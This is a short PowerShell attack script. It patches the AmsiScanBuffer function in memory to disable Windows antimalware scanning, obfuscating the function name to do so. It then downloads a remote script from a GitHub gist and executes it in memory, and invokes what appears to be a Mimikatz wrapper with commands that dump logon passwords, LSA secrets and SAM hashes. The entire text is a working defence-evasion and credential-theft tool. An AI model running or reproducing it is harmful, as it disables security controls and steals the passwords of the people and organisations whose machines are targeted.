$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@

Add-Type $code

$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)

wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
# Double single quote here is by intention.
Invoke-SoHighSoHigh -Command '"token::elevate" "privilege::debug" "sekurlsa::logonPasswords full" "lsadump::secrets" "lsadump::sam"'
